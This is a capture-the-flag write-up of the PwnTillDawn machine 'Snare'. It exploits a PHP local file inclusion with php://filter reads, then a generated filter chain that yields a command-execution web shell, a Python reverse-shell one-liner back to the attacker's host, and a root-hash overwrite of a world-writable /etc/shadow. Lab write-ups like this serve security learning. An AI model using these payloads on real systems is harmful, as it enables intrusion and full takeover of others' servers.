---
layout: default
title: Snare PwnTillDawn
---

# 💀 Snare
### Category: Boot2Root
### Platform: PwnTillDawn
### Difficult:Easy

<hr>

### Description:
Snare is an easy-rated machine on PwnTillDawn. The initial foothold is achieved through a Local File Inclusion (LFI) vulnerability, which is later escalated to Remote Code Execution (RCE) using a PHP filter chain attack.
![Snare Overview](/images/articles/snare/snare.png)

## Reconnaissance:

I started with standard network reconnaissance using **nmap**: `nmap <ip> -p- -A -T 4 -vv`
![image](/images/articles/snare/nmap.png)

We have two ports open `22(SSH) and 80(HTTP)`

Then I ran dir bruteforce on port 80 using `ffuf` `ffuf -u http://<ip>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .js,.txt,.json,.php,.xml`
```
contact.php [Status: 200, Size: 941, Words: 138, Lines: 9, Duration: 266ms]
about.php [Status: 200, Size: 996, Words: 147, Lines: 9, Duration: 231ms]
home.php [Status: 200, Size: 946, Words: 140, Lines: 9, Duration: 240ms]
includes [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 554ms]
```
With this information, I manually explored the web application. Accessing `<ip>/index.php?page=home` indicated a **potential LFI** via the page parameter.

Exploring /includes, I found several PHP files 
![image](/images/articles/snare/includes.png)

Then back to `<ip>/index.php?page=home` changed the page parameter value to `includes/a_config` go nothing then I try to use `php://filter` wrapper like this `php://filter/convert.base64-encode/resource=includes/a_config` then boom I have the base64 encoded value of a_config.php file
```
curl -s http://10.150.150.18/index.php?page=php://filter/convert.base64-encode/resource=includes/a_config
<!DOCTYPE html>
<html>                          
<head>                           
        <title>Welcome to my homepage!</title>                         
        <meta name="description" content="/>                                                                       
        <meta name="keywords" content="" />    
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"> 
<style>                                                                            
        #main-content {                                                                          
                margin-top:20px;                                                   
        }                                                                          
        .footer {                                                                          
                font-size: 14px;                                                                                     
                text-align: center;                                                            
        }
</style></head>   
<body>            
<div class="jumbotron">                                                                 
        <h1>Hello there!</h1>                                                                        
</div><div class="container">                                                                 
        <ul class="nav nav-pills">                                                                
          <li class="nav-item">
            <a class="nav-link " href="index.php">Home</a>                                                           
          <li>  
          <liclass="nav-item">                                                     
            <a class="nav-link " href="index.php?page=about">About Us</a>                                            
          <li>                                                                     
          <li class="nav-item">
            <a class="nav-link " href="index.php?page=contact">Contact <a>                                           
          <li>                                                                     
        <ul>                                                                       
<div>                       
<div class="container" id="main-content">                        
PD9waHANCglzd2l0Y2ggKCRfU0VSVkVSWyJTQ1JJUFRfTkFNRSJdKSB7DQoJCWNhc2UgIi9waHAtdGVtcGxhdGUvYWJvdXQucGhwIjoNCgkJCSRDVVJSRU5UX1BBR0UgPSAiQWJvdXQiOyANCgkJCSRQQUdFX1RJVExFID0gIkFib3V0IFVzIjsNCgkJCWJyZWFrOw0KCQljYXNlICIvcGhwLXRlbXBsYXRlL2NvbnRhY3QucGhwIjoNCgkJCSRDVVJSRU5UX1BBR0UgPSAiQ29udGFjdCI7IA0KCQkJJFBBR0VfVElUTEUgPSAiQ29udGFjdCBVcyI7DQoJCQlicmVhazsNCgkJZGVmYXVsdDoNCgkJCSRDVVJSRU5UX1BBR0UgPSAiSW5kZXgiOw0KCQkJJFBBR0VfVElUTEUgPSAiV2VsY29tZSB0byBteSBob21lcGFnZSEiOw0KCX0NCj8+</div>                      
<div class="footer">                                                                                                 
        &copy; 2026</div>                                                                 
<body>                           
</html> 
```
Now lets decode it 
```
echo "PD9waHANCglzd2l0Y2ggKCRfU0VSVkVSWyJTQ1JJUFRfTkFNRSJdKSB7DQoJCWNhc2UgIi9waHAtdGVtcGxhdGUvYWJvdXQucGhwIjoNCgkJCSRDVVJSRU5UX1BBR0UgPSAiQWJvdXQiOyANCgkJCSRQQUdFX1RJVExFID0gIkFib3V0IFVzIjsNCgkJCWJyZWFrOw0KCQljYXNlICIvcGhwLXRlbXBsYXRlL2NvbnRhY3QucGhwIjoNCgkJCSRDVVJSRU5UX1BBR0UgPSAiQ29udGFjdCI7IA0KCQkJJFBBR0VfVElUTEUgPSAiQ29udGFjdCBVcyI7DQoJCQlicmVhazsNCgkJZGVmYXVsdDoNCgkJCSRDVVJSRU5UX1BBR0UgPSAiSW5kZXgiOw0KCQkJJFBBR0VfVElUTEUgPSAiV2VsY29tZSB0byBteSBob21lcGFnZSEiOw0KCX0NCj8+" | base64 -d
<?php
        switch ($_SERVER["SCRIPT_NAME"]) {                                                                          
                case "/php-template/about.php":
                        $CURRENT_PAGE = "About";
                        $PAGE_TITLE = "About Us"; 
                        break;
                case "/php-template/contact.php":
                        $CURRENT_PAGE = "Contact";
                        $PAGE_TITLE = "Contact Us";
                        break;
                default:
                        $CURRENT_PAGE = "Index";
                        $PAGE_TITLE = "Welcome to my homepage!";                                                     
        }                
?> 
```
Also lets read and decode the index.php file
```
PD9waHAgaW5jbHVkZSgiaW5jbHVkZXMvYV9jb25maWcucGhwIik7Pz4NCjwhRE9DVFlQRSBodG1sPg0KPGh0bWw+DQo8aGVhZD4NCgk8P3BocCBpbmNsdWRlKCJpbmNsdWRlcy9oZWFkLXRhZy1jb250ZW50cy5waHAiKTs/Pg0KPC9oZWFkPg0KPGJvZHk+DQoNCjw/cGhwIGluY2x1ZGUoImluY2x1ZGVzL2Rlc2lnbi10b3AucGhwIik7Pz4NCjw/cGhwIGluY2x1ZGUoImluY2x1ZGVzL25hdmlnYXRpb24ucGhwIik7Pz4NCg0KPGRpdiBjbGFzcz0iY29udGFpbmVyIiBpZD0ibWFpbi1jb250ZW50Ij4NCg0KPD9waHANCg0KaWYgKGVtcHR5KCRfR0VUKSkgew0KCWhlYWRlcignTG9jYXRpb246IC9pbmRleC5waHA/cGFnZT1ob21lJyk7DQp9IA0KZWxzZSB7DQoJJHBhZ2UgPSAkX0dFVFsncGFnZSddOw0KCWluY2x1ZGUgKCRwYWdlLiAnLnBocCcpOw0KfQ0KPz4NCjwvZGl2Pg0KDQo8P3BocCBpbmNsdWRlKCJpbmNsdWRlcy9mb290ZXIucGhwIik7Pz4NCg0KPC9ib2R5Pg0KPC9odG1sPg0K
```
Decoded result:
```
<?php include("includes/a_config.php"); ?>
<!DOCTYPE html>
<html>
<head>
    <?php include("includes/head-tag-contents.php"); ?>
</head>
<body>
<?php include("includes/design-top.php"); ?>
<?php include("includes/navigation.php"); ?>
<div class="container" id="main-content">
<?php
if (empty($_GET)) {
    header('Location: /index.php?page=home');
} else {
    $page = $_GET['page'];

    include($page . '.php');
}
?>
</div>
<?php include("includes/footer.php"); ?>
</body>
</html>
```
**Observation**: The `include()` directly uses user input. This is a classic LFI that can be escalated to RCE using PHP filter chains.

* * *

### The Exploitation:
Download the php_filter_chain_generator script from [Github](https://github.com/synacktiv/php_filter_chain_generator) then run ``python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`?>'`` to generate the chain

```
python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`?>'
[+] The following gadget chain will generate the following code : <?=`$_GET[0]`?> (base64 value: PD89YCRfR0VUWzBdYD8+)                  
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```
Send the following part has the page parameter value
 ```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=id
```
![image](/images/articles/snare/rce.png)

Boom RCE confirm, replace `id` in the above with the below and run `nc-lvpn 4000` on my machine then got a reverse shell 
```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<ip>",4000));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```
![image](/images/articles/snare/rev_shell.png)
![image](/images/articles/snare/rev2_shell.png)

* * *

### Privilege Esclation

I noticed I have write permission to `/etc/shadow` file: `-rwxrwxrwx 1 root shadow 1129 Nov 20  2020 /etc/shadow` 
Then I generate a new hash password for root user using `openssl passwd <any passwd>` then I downlaod the /etc/shadow file to my linux machine, edited the hashed root passwd to the generated hash then send it back to the remote machine. After this I run su root then enter the password I used in `openssl passwd <any passwd>` and boom I gain root shell
![Hash edit](/images/articles/snare/hash_edit.png)
![Root shell](/images/articles/snare/root.png)
Lesson: Writable `/etc/shadow` is a critical misconfiguration and allows complete system compromise.

### Key Takeaways
* Never pass unsanitized user input into include() or require().
* PHP filter chains can bypass basic LFI protections.
* Restrict sensitive file permissions (like /etc/shadow) to prevent privilege escalation.
* Always validate and sanitize users inputs.

---

Thanks For reading, Till next time

---

<a href="https://d3vnul10.github.io" style="display:inline-block; padding:8px 12px; background:#00ff00; color:#000; text-decoration:none; border-radius:4px;">
⬅ Back to Home
</a>
